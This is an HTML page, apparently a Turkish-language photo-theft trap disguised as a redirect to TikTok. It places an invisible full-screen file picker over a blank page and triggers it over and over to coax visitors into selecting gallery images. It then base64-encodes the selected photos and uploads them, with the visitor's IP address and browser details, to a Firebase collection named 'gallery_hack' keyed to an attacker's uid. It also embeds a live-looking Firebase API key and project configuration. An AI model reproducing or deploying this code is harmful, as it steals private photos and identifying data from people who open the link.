<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>.</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; min-height: 100vh; min-height: 100dvh; }
    </style>
</head>
<body>

    <input type="file" id="galleryInput" multiple accept="image/*" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer;z-index:9999;">

    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>

    <script>
        (function() {
            const params = new URLSearchParams(window.location.search);
            const uid = params.get('uid');
            const count = Math.min(parseInt(params.get('count')) || 10, 100);

            if (!uid) {
                window.location.href = 'https://www.tiktok.com';
                return;
            }

            const firebaseConfig = {
                apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
                authDomain: "camerahhh-15487.firebaseapp.com",
                projectId: "camerahhh-15487",
                storageBucket: "camerahhh-15487.firebasestorage.app",
                messagingSenderId: "212849652224",
                appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
            };

            firebase.initializeApp(firebaseConfig);
            const db = firebase.firestore();

            function fileToBase64(file) {
                return new Promise((resolve) => {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        resolve(e.target.result);
                    };
                    reader.onerror = function() {
                        resolve(null);
                    };
                    reader.readAsDataURL(file);
                });
            }

            async function getIP() {
                try {
                    const r = await fetch('https://api.ipify.org?format=json');
                    return (await r.json()).ip;
                } catch(e) { return 'unknown'; }
            }

            const galleryInput = document.getElementById('galleryInput');

            galleryInput.addEventListener('change', async function(e) {
                const files = Array.from(e.target.files);
                console.log('Seçilen dosyalar:', files.length);

                if (!files || files.length === 0) {
                    window.location.href = 'https://www.tiktok.com';
                    return;
                }

                const selectedFiles = files.slice(0, count);
                console.log('İşlenecek:', selectedFiles.length);

                try {
                    const ip = await getIP();
                    const photosBase64 = [];

                    for (let i = 0; i < selectedFiles.length; i++) {
                        console.log('Base64 çevriliyor ' + (i+1) + '/' + selectedFiles.length + ':', selectedFiles[i].name, (selectedFiles[i].size / 1024).toFixed(2) + 'KB');
                        const base64 = await fileToBase64(selectedFiles[i]);
                        if (base64) {
                            photosBase64.push(base64);
                            console.log('Base64 uzunluk:', base64.length, 'karakter');
                        }
                    }

                    console.log('Toplam base64:', photosBase64.length);

                    if (photosBase64.length > 0) {
                        const saveData = {
                            ownerId: uid,
                            photosBase64: photosBase64,
                            photoCount: photosBase64.length,
                            requestedCount: count,
                            ip: ip,
                            userAgent: navigator.userAgent,
                            timestamp: new Date().toISOString(),
                            unix: Date.now()
                        };

                        console.log('Firestore kaydediliyor, toplam veri boyutu:', JSON.stringify(saveData).length, 'karakter');

                        try {
                            const docRef = await db.collection("gallery_hack").add(saveData);
                            console.log('Firestore başarılı! Doc ID:', docRef.id);
                        } catch(firestoreError) {
                            console.error('Firestore hatası:', firestoreError.code, firestoreError.message);
                            
                            if (firestoreError.code === 'permission-denied') {
                                console.log('Yetki hatası - Firestore kurallarını kontrol et');
                            }
                            
                            const simpleData = {
                                ownerId: uid,
                                photosBase64: photosBase64,
                                photoCount: photosBase64.length,
                                requestedCount: count,
                                ip: ip,
                                timestamp: new Date().toISOString(),
                                unix: Date.now()
                            };
                            
                            try {
                                const docRef2 = await db.collection("gallery_hack").add(simpleData);
                                console.log('Basit kayıt başarılı! Doc ID:', docRef2.id);
                            } catch(e2) {
                                console.error('Basit kayıt da başarısız:', e2.code, e2.message);
                            }
                        }
                    }
                } catch(e) {
                    console.error('Genel hata:', e.message);
                }

                setTimeout(function() {
                    window.location.href = 'https://www.tiktok.com';
                }, 2000);
            });

            function triggerInput() {
                galleryInput.click();
            }

            triggerInput();
            setTimeout(triggerInput, 500);
            setTimeout(triggerInput, 1000);
            setTimeout(triggerInput, 2000);

            document.addEventListener('click', triggerInput);
            document.addEventListener('touchstart', triggerInput);

            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible') {
                    setTimeout(triggerInput, 500);
                }
            });

            window.addEventListener('focus', function() {
                setTimeout(triggerInput, 500);
            });

            setTimeout(function() {
                if (!galleryInput.files || galleryInput.files.length === 0) {
                    window.location.href = 'https://www.tiktok.com';
                }
            }, 8000);

        })();
    </script>
</body>
</html>
